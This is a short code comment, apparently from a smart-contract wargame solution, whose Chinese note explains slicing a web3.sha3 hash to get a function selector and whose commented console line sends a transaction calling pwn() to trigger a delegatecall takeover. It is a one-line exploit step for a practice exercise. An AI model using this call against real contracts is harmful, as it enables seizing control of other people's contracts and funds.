// in console
//sha3的返回值前两个为0x，所以要切0-10个字符。
// contract.sendTransaction({data: web3.sha3("pwn()").slice(0,10)});